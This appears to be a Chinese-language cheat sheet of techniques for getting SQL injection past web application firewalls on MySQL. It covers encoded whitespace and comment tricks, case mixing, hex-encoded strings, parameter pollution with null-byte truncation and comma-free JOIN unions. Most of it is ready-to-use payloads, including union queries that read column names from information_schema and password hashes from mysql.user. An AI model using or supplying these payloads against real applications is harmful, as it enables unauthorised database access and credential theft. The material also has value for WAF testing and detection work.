# 1.空格字符绕过
>两个空格代替一个空格或者用tab代替空格，%a0=空格
>%20 %09 %0a %0b %0c %0d %a0 %00 `/**/`  `/*!*/`
>`select * from users where id=1 /*!union*//*!select*/1,2,3,4`;
>%09  TAB键(水平)
>%0a  新建一行
>%0c  新的一页
>%0d  return功能
>%0b  TAB键(垂直)
>%a0  空格
*`/*！这里根据mysql版本的内容不注释*/`*
# 2.大小写绕过
将字符串设置为大小写，例如and 1=1 转成 AND 1=1或 AnD 1=1
# 3.浮点数绕过注入
>`select * from users where id=8E0union select 1,2,3,4;`
>`select * from users where id=8.0union select 1,2,3,4;`
# 4.NULL值绕过
>select `\n`; 代表null
>select * from users where id=`\N`union select 1,2,3,`\N`;
>select * from users where id=`\N`union select 1,2,3,`\N`from users;
# 5.引号绕过
waf拦截单/双引号的时候，我们可以用双/单引号绕过，在mysql里也可以使用双引号作为字符串。
>select * from users where id='1';
>select * from users where id="1";

也可以将字符串转换成16进制，再进行查询

>select hex('admin');
>select * from users where username='admin';
>select * from users where username=0x61646D696E;

如果gpc开启了，注入点是整型也可以用hex十六进制进行绕过
>select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME='users' limit 1),4;
>
>select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME=0x7573657273 limit 1),4;
>可以看到存在整型的时候没有用到单引号，所以可以注入。
# 5.添加库名绕过
 以下两条查询语句，执行的结果是一致的，但是有些waf的拦截规则，并不会拦截[库名].[表名这种模式]。
 >select * from users where id=-1 union select 1,2,3,4 from users;
 >select * from users where id=-1 union select 1,2,3,4 from test.users;

 同时mysql中也可以添加库名查询表。例如跨库查询mysql库里的users表的内容。
 >select * from users where id=-1 union select 1,2,3,concat(user,authentication_string) from mysql.user;
# 6.去重复绕过
 在mysql查询可以使用distinct去除查询的重复值。可以利用这点突破waf拦截

 >select * from users where id=-1 union distinct select 1,2,3,4 from users;
 >select * from users where id=-1 union distinct select 1,2,3,version() from users;
# 7.反引号绕过
在mysql可以使用\`来绕过一些waf拦截。
>insert into users(username,password,email)values('admin','123456','admin@163.com');
>insert into users(\`username\`,\`password\`,\'email\')values('admin','123456','admin@163.com');
# 8.脚本语言特性绕过
在php语言中，id=1&id=2后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些waf拦截。
>id=1%00&id=2 union select 1,2,3

有些waf会去匹配第一个id参数1%00,%00是截断字符，waf会自动截断，从而不会检测后面的内容。到了程序中就会运行后面的id=2 union select 1,2,3从而绕过注入拦截。
![[475232858747992656.pdf]]
# 9.逗号绕过
当waf过滤逗号的时候，可以通过join方法来进行绕过
>union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);
>union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);
